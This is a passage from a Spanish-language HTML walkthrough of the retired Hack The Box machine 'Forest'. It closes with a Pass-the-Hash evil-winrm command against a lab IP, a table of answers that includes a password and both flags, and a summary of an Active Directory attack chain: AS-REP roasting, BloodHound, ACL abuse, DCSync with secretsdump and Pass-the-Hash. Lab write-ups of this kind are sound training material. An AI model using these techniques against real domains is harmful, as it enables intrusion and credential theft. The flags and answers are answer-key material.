+    <h3 class="step">Pass-the-Hash · Domain Admin</h3>
+    <p class="f">No hace falta crackear ese hash. En Windows te autenticas con el hash directamente (<b>Pass-the-Hash</b>): en vez de <code class="ic">-p contraseña</code>, usas <code class="ic">-H hash</code>.</p>
+    <pre><span class="k">evil-winrm</span> -i 10.129.62.145 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+<span class="k">type</span> C:\Users\Administrator\Desktop\root.txt   <span class="cmt"># -&gt; 650ace87ec9847f97c3deb4b998ef61a</span></pre>
+    <p class="f"><b>Eres Domain Admin. Forest comprometida por completo.</b> 🏴‍☠️</p>
+  </div>
+</section>
+
+<!-- ===================== TASKS ===================== -->
+<section id="tasks" style="--acc:var(--amber)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">TASKS · GUIDED MODE</h2></div>
+    <div class="sec-focus">Las flags son de una instancia concreta. En tu máquina serán distintas.</div>
+    <div class="tblwrap"><table>
+      <tr><th>Task</th><th>Respuesta</th></tr>
+      <tr><td>¿De qué dominio es esta máquina el Domain Controller?</td><td class="ans">htb.local</td></tr>
+      <tr><td>Servicio que permite autenticación anónima e info valiosa</td><td class="ans">LDAP</td></tr>
+      <tr><td>¿Qué usuario tiene la pre-autenticación de Kerberos deshabilitada?</td><td class="ans">svc-alfresco</td></tr>
+      <tr><td>Contraseña del usuario svc-alfresco</td><td class="ans">s3rvice</td></tr>
+      <tr><td>Puerto para conectar y obtener una shell interactiva</td><td class="ans">5985 (WinRM)</td></tr>
+      <tr><td>Grupo que permite a svc-alfresco auto-agregarse a "Exchange Windows Permissions"</td><td class="ans">Account Operators</td></tr>
+      <tr><td>Grupo con permisos WriteDACL sobre el dominio HTB.LOCAL</td><td class="ans">Exchange Windows Permissions</td></tr>
+      <tr><td>Ataque para elevar privilegios con WriteDACL sobre el dominio</td><td class="ans">DCSync</td></tr>
+      <tr><td>User flag</td><td><code>8a961daab9f55e5a4a4a738aa69b0434</code></td></tr>
+      <tr><td>Root flag</td><td><code>650ace87ec9847f97c3deb4b998ef61a</code></td></tr>
+    </table></div>
+  </div>
+</section>
+
+<!-- ===================== TAKEAWAYS ===================== -->
+<section id="takeaways" style="--acc:var(--green)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">CONCEPTOS NUEVOS (EL MUNDO AD)</h2></div>
+    <div class="sec-focus">Forest abre Active Directory: un arsenal entero que Cap y Knife no tenían.</div>
+    <ul class="takeaways">
+      <li><b>Fingerprint de DC:</b> 20+ puertos con Kerberos (88) + LDAP (389/636) + SMB (445) + DNS (53) = Domain Controller. <code class="ic">ttl=127</code> = Windows.</li>
+      <li><b><code class="ic">/etc/hosts</code> en AD:</b> mapear el dominio a la IP es obligatorio; muchas herramientas Kerberos fallan por IP.</li>
+      <li><b>Enumeración anónima:</b> SMB con <code class="ic">Null Auth</code> / LDAP <em>anonymous bind</em> → lista de usuarios del dominio sin credenciales.</li>
+      <li><b>AS-REP Roasting:</b> cuentas sin pre-auth de Kerberos (típico en <code class="ic">svc-</code>) → hash con <code class="ic">GetNPUsers</code>, crackeable offline.</li>
+      <li><b>Cracking:</b> <code class="ic">john</code> cuando no hay GPU; autodetecta el tipo de hash. rockyou como diccionario.</li>
+      <li><b>Validar y entrar:</b> <code class="ic">netexec smb/winrm</code> (<code class="ic">Pwn3d!</code>) → <code class="ic">evil-winrm</code> para shell.</li>
+      <li><b>BloodHound:</b> recolectar con <code class="ic">bloodhound-python</code>, analizar el grafo, leer el camino a Domain Admin.</li>
+      <li><b>Abuso de ACLs:</b> <code class="ic">GenericAll</code> (control total) y <code class="ic">WriteDacl</code> (modificar permisos) con PowerView.</li>
+      <li><b>DCSync:</b> abusar de la replicación para volcar todos los hashes (<code class="ic">secretsdump</code>), incluido Administrator.</li>
+      <li><b>Pass-the-Hash:</b> autenticarte con el hash NTLM sin conocer la contraseña (<code class="ic">-H</code>).</li>
+    </ul>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div><span class="g">iphobiuss@offsec</span>:~$ <span class="mono">echo "del anonymous bind al Domain Admin: nueve saltos, un dominio entero."</span></div>
+  <div>Forest · Hack The Box · máquina retirada · guía para principiantes · #3 de la serie · primera AD</div>
+  <div>
+    <a href="index.html">Knowledge base</a> ·
+    <a href="knife.html">← Knife</a> ·
+    <a href="https://github.com/iphobiuss" target="_blank" rel="noopener">GitHub</a> ·
+    <a href="https://www.linkedin.com/in/sebastian-latorre-munoz/" target="_blank" rel="noopener">LinkedIn</a>
+  </div>
+  <div class="rev">Sebastián Latorre Muñoz · Santiago, CL</div>
+</footer>
+</body>
+</html>
